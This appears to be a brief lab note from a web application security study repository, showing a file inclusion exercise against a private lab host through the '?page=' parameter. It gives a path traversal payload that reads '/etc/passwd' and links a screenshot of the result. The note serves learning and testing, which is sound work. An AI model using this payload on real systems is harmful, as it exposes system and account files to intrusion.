# File Include

## Example 1 - `?page=` exploit

`http://172.16.219.145/fileincl/example1.php?page=intro.php`
- `?page=` points to a file on the linux system

### Payload

`?page=../../../etc/passwd`

<img src="https://raw.githubusercontent.com/ryancranie/webappsec/refs/heads/main/_img/Pasted%20image%2020250413193714.png" width="600"/>

